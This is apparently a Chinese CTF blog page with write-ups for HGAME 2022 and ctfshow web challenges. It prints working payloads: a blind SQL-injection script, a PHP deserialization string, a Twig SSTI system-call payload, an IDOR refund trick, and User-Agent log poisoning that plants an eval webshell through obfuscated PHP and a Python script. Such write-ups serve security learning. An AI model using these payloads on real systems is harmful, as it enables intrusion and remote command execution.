AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http:<span class="comment">//127.0.0.1:60010/flag HTTP/1.1</span></span><br></pre></td></tr></table></figure>
<p>（由于我写的是都服务器似乎关闭了，因此没有得到flag）</p>
<h2 id="web-Pokemon"><a href="#web-Pokemon" class="headerlink" title="web Pokemon"></a>web Pokemon</h2><p>本题考查sql注入中的二分法盲注<br>过滤=用like绕过<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39557087/article/details/113441010">mysql 注释 绕过_SQL注入绕过方法</a><br>poc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://121.43.141.153:60056/error.php?code=&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (head &lt; tail):</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = &quot;if(ascii(substr(database(),%d,1))&gt;%d,404,403)&quot; % (i , mid)</span></span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((selselectect/*/**/*/flag/*/**/*/frfromom/*/**/*/fllllllllaaaaaag),%d,1))&gt;%d,404,403)&quot;</span> % (i, mid)</span><br><span class="line">        <span class="comment">#payload = &quot;if(ascii(substr((selselectect/*/**/*/group_concat(column_name)frfromom(infoorrmation_schema.columns)whwhereere(table_name/*/**/*/like/*/**/*/&#x27;fllllllllaaaaaag&#x27;)),%d,1))&gt;%d,404,403)&quot; % (i, mid)</span></span><br><span class="line"></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="comment">#r.encoding = &quot;utf-8&quot;</span></span><br><span class="line">        <span class="comment"># print(url+payload)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;404&quot;</span> in r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    last = result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web-一本单词书"><a href="#web-一本单词书" class="headerlink" title="web 一本单词书"></a>web 一本单词书</h2><blockquote>
<p>substr(string,start,length)     substr() 函数返回字符串的一部分。<br>strstr() 函数搜索字符串在另一字符串中的第一次出现。<br>strpos() 函数查找字符串在另一字符串中第一次出现的位置。</p>
</blockquote>
<p>看源码，发现<a target="_blank" rel="noopener" href="http://www.zip得压缩包/">www.zip得压缩包</a><br>下载得源码<br>在save.php中发现可以操作session文件<br><img src="https://img-blog.csdnimg.cn/5337af59de4a4effb4cd0550b4e71c58.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在get.php中发现可以进行反序列化<br><img src="https://img-blog.csdnimg.cn/fa09811a461d4b5f87eaf187fe213aa0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>由于数据处理时为json_decode所以键值对的键可控，注入session文件，反序列化读取文件<br>paylaod</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;y0ng|O:4:\&quot;Evil\&quot;:2:&#123;s:4:\&quot;file\&quot;;s:5:\&quot;/flag\&quot;;s:4:\&quot;flag\&quot;;N;&#125;&quot;</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web-SecurityCenter"><a href="#web-SecurityCenter" class="headerlink" title="web SecurityCenter"></a>web SecurityCenter</h2><p>看源码，发现<br><img src="https://img-blog.csdnimg.cn/6abe78c323dd475d850362ea85b14b90.png" alt="在这里插入图片描述"><br>进入之后发现是twig框架<br><img src="https://img-blog.csdnimg.cn/430d0333a13f4a8cb57a36010cc7d7d2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>扫目录发现<img src="https://img-blog.csdnimg.cn/b44ce02bf42847e1af810ec398b0cda4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>进入/redirect.php<br>发现存在ssti<br><img src="https://img-blog.csdnimg.cn/64e0d8978422400cbdd8f9a46dc503ae.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7518#toc-0">TWIG 全版本 通用 SSTI payload</a></p>
<p>利用上面得payload<br>得到题解</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=&#123;&#123;[<span class="string">&quot;base64+/f*&quot;</span>,%<span class="number">200</span>]|sort(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>直接/f*是无回显得<br>必须前面加上base64编码</p>
<h2 id="web-Vidar-shop-demo"><a href="#web-Vidar-shop-demo" class="headerlink" title="web Vidar shop demo"></a>web Vidar shop demo</h2><p>注册用户然后发现账户有9999元，商店里面flag需要1w<br>应该就是逻辑漏洞或者竞争，点击flag商品和其他一个商品进行下单<br>先把20的支付一下<br>发现之后还可以删除退钱<br>抓包<br>修改uid<br><img src="https://img-blog.csdnimg.cn/0612f31e309b4a78a149094a0003756e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现当点击删除时，发起一个对应ID的包，将id改为flag对应id 2637放包发现退还了1w，再次购买flag，成功<br><img src="https://img-blog.csdnimg.cn/29c35cb85bbd4fa5a2a1c981801caa51.png" alt="在这里插入图片描述"></p>
<h2 id="web-LoginMe"><a href="#web-LoginMe" class="headerlink" title="web LoginMe"></a>web LoginMe</h2><p>进入后直接尝试sqlmap发现可以使用<br>直接sqlmap一把梭<br><img src="https://img-blog.csdnimg.cn/34d90f8e73804038a70fc18f6fe9b813.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>得到密码登录得到flag</p>
<h2 id="web-Comment"><a href="#web-Comment" class="headerlink" title="web Comment"></a>web Comment</h2><p>打开题目，下载源码，发现<br><img src="https://img-blog.csdnimg.cn/9ac0941e667c4ef282f3c3de0c20314f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>libxml_disable_entity_loader(false); 允许外部实体，waf了一些关键字<br><img src="https://img-blog.csdnimg.cn/377dad0cdbde4c7bad5fd81c8e572d88.png" alt="在这里插入图片描述"><br>可以发现sender必须为admin，但是输入内容却不能有admin<br>尝试利用一百万个字符绕过preg_match，但是没成功<br>之后不会了！！！<br><strong>之后补上</strong></p>
<h2 id="web-Markdown-online"><a href="#web-Markdown-online" class="headerlink" title="web Markdown online"></a>web Markdown online</h2><p>下载附件<br>得到源码<br>看登录控制器<br><img src="https://img-blog.csdnimg.cn/89ddcc913ac34e02b2d7cb5c81f2abb2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>要使password长度为16且=54g<br>由于toUpperCase()函数使得字符都改为大写，则登录条件无法成立<br>但登录处只要让 toUpperCase 抛出异常就可以登陆成功，让password为数组即可使其长度为16绕过</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="attr">&quot;password&quot;</span>:[<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>
<p>登陆后便不会了【哭笑】<br><a target="_blank" rel="noopener" href="http://www.yongsheng.site/2022/02/17/HGAME%202022%20WEB/#more">第4周题目的大佬博客</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/01/15/ctfshow%20%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/">ctfshow 黑盒测试</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-01-15</time><div class="content"><h2 id="黑盒测试简介"><a href="#黑盒测试简介" class="headerlink" title="黑盒测试简介"></a>黑盒测试简介</h2><blockquote>
<p>黑盒测试又称功能测试，是在不了解程序内部结构和内部特性的情况下进行的测试方法，黑盒测试只验证程序是否能按照需求规格说明书的规定正常使用，是否能适当的接收数据并给出适当的输出结果，如错误提示，或正确的界面等。</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/l199616j/p/11403666.html">黑盒测试详细简介</a></p>
<h2 id="web380"><a href="#web380" class="headerlink" title="web380"></a>web380</h2><p>打开后发现是一个网站，之后扫一下目录发现page.php下有东西打开<br>看到<br><img src="https://img-blog.csdnimg.cn/bc45b3f918fe41878e72fad9719a273e.png" alt="在这里插入图片描述"><br>于是payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page.php?id=flag</span><br></pre></td></tr></table></figure>

<h2 id="web381"><a href="#web381" class="headerlink" title="web381"></a>web381</h2><p>看源码发现<br><img src="https://img-blog.csdnimg.cn/06100a50bcd040cfb55a0de607687548.png" alt="在这里插入图片描述"><br>它与其他的有差别，多了个文件夹，访问得到<br><img src="https://img-blog.csdnimg.cn/081e1a8e4d6e4b308ac9c898ffa7adb6.png" alt="在这里插入图片描述"></p>
<h2 id="web382、383"><a href="#web382、383" class="headerlink" title="web382、383"></a>web382、383</h2><p>和上一题一样，在相同的文件下，发现需要账号密码<br><img src="https://img-blog.csdnimg.cn/9cdc27d0198e417bb935e329ef9fbc25.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>利用万能密码得到flag</p>
<h2 id="web384"><a href="#web384" class="headerlink" title="web384"></a>web384</h2><p>和上面一样，进入目录后发现万能密码没用<br>看到提示<br><img src="https://img-blog.csdnimg.cn/62e4f12f2f9d4cdb85d55b78ca59e86b.png" alt="在这里插入图片描述"><br>想到爆破<br>利用脚本造出密码字典</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">s1=string.ascii_lowercase</span><br><span class="line">s2=string.digits</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;dict.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s1:</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> s1:</span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> s2:</span><br><span class="line">			<span class="keyword">for</span> l <span class="keyword">in</span> s2:</span><br><span class="line">				<span class="keyword">for</span> m <span class="keyword">in</span> s2:</span><br><span class="line">					p=i+j+k+l+m</span><br><span class="line">					f.write(p+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>于是爆破<br>得到密码  xy123<br>得到flag</p>
<h2 id="web385"><a href="#web385" class="headerlink" title="web385"></a>web385</h2><p>本题先爆一下目录，发现/install目录存在<br>按照提示访问/install/?install<br>之后访问/alsckdfy，进行登录<br>发现账号密码不知道，于是sql注入<br>若是当前无法注入则前往382题注入获取初始账号密码<br>注入后发现密码为<br><img src="https://img-blog.csdnimg.cn/5e0ac41798a74c8c95c46ac9914803ea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_18,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>账号为admin<br>登录得到flag</p>
<h2 id="web386"><a href="#web386" class="headerlink" title="web386"></a>web386</h2><p>看到页面，先用工具扫目录，发现没扫出来，之后看大佬博客，发现具有<br>clear.php和install（扫描工具太菜！！！），通过分析，发现clear.php可以传参参数为file<br>(注意lock.dat在install下)<br>因此进行<br>?file=install/lock.dat<br><img src="https://img-blog.csdnimg.cn/021fb4446af342faade23895fa83ee5b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>或者可以在这里发现目录clear.php<br><img src="https://img-blog.csdnimg.cn/89d0af312bd14c14b60a8fffb449c2cf.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/96fa9ad559794b8b887b9fac7b22034a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="如图操作"></p>
<p>之后的步骤与上一题一样（访问install…….）</p>
<h2 id="web387"><a href="#web387" class="headerlink" title="web387"></a>web387</h2><p>打开题目，发现上一题思路都不行，之后进行尝试<br>得到<br><img src="https://img-blog.csdnimg.cn/e46e35b377664b25a6c0bd1cee9143c1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>访问/debug得到<br>通过？file传参看日志<br><img src="https://img-blog.csdnimg.cn/188a9c0dbd464c0a899ec4e5653c9860.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现可以访问，之后试一试一句话放在ua上进行传参，发现没有传参权限<br>看大佬博客，大佬是利用unlink函数将dat文件删掉<br>利用（写在ua中）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> unlink(<span class="string">&#x27;/var/www/html/install/lock.dat&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>之后访问日志后在访问install得到<br><img src="https://img-blog.csdnimg.cn/8036e79d6634491bba538ff7c22e33cc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>之后同上一样得到flag</p>
<h2 id="web388"><a href="#web388" class="headerlink" title="web388"></a>web388</h2><p>进入题目访问/alsckdfy/editor/<br>发现<br><img src="https://img-blog.csdnimg.cn/e3815dcc9d4d46c2a17e86a7ddb19344.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>由于kindEditor编辑4.1.11是存在上传过滤不严的漏洞的，可以上传txt或者zip文件。同时在、debug处存在包含漏洞<br>因此<br>上传文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;metsys&#x27;</span>;</span><br><span class="line"></span><br><span class="line">strrev(<span class="variable">$a</span>)(<span class="string">&#x27;echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+|base64 -d &gt; /var/www/html/1.php&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/4b356e0bba974a83b47ae70e6f26e5d6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>之后在debug处访问<img src="https://img-blog.csdnimg.cn/f98cf8f0c2b14ca7ada556df6833ac58.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>访问1.php得到shell<br><img src="https://img-blog.csdnimg.cn/b0a47a327e4545948eeb7106601f2a45.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>或用脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&quot;http://fb707431-ebb7-41c8-9ce7-57da16163fec.chall.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://fb707431-ebb7-41c8-9ce7-57da16163fec.chall.ctf.show/debug/?file=/var/log/nginx/access.log&quot;</span></span><br><span class="line">cmd=<span class="string">b&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span></span><br><span class="line">cmd=base64.b64encode(cmd).decode()</span><br><span class="line">headers=&#123;</span><br><span class="line">	<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;&#x27;&#x27;&lt;?php system(&#x27;echo &#123;0&#125;|base64 -d  &gt; /var/www/html/b.php&#x27;);?&gt;&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(cmd)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(headers)</span><br><span class="line">requests.get(url=url,headers=headers)</span><br><span class="line">requests.get(url2)</span><br><span class="line"><span class="built_in">print</span>(requests.post(url+<span class="string">&#x27;b.php&#x27;</span>,data=&#123;<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;system(&quot;cat alsckdfy/check.php&quot;);&#x27;</span>&#125;).text)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web389"><a href="#web389" class="headerlink" title="web389"></a>web389</h2><p>访问/debug发现没权限<br>抓包，发现具有jwt<br>修改jwt，改为admin，密钥为123456<br>将修改后的jwt放入cookie中，发现有权限了<br><img src="https://img-blog.csdnimg.cn/0e385a40fa1e4598a5a7a7b2599bb625.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>因此使用脚本（上题用第一种也行）</p>
